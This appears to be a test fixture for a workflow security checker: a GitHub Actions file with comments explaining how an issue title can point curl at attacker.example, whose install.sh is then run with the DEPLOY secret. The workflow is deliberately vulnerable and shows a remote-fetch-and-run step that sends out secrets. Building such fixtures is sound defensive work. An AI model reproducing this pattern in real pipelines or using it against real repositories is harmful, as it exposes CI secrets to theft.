@@ -1,0 +1,24 @@
+# situation: on issues, a step on a GitHub-hosted runner downloads
+#   install.sh from the host that the issue's title names, without a
+#   credential, and a later step runs install.sh with a secret.
+# reason: the attacker's server writes install.sh, and bash runs install.sh
+#   with the job's secrets and token.
+# cause: the rule reads the request, which carries no credential from a
+#   GitHub-hosted runner, and does not follow the response to the step that
+#   runs it.
+# attack: the attacker opens an issue titled attacker.example, the host of a
+#   server whose /install.sh sends $TOKEN to the attacker.
+# attack-run-behavior: curl downloads install.sh from attacker.example, and
+#   bash install.sh in the later step runs the script of the attacker, which
+#   sends the secret DEPLOY to the server of the attacker.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsS "https://$HOST/install.sh" -o install.sh
+        env:
+          HOST: ${{ github.event.issue.title }}
+      - run: bash install.sh
+        env:
+          TOKEN: ${{ secrets.DEPLOY }}
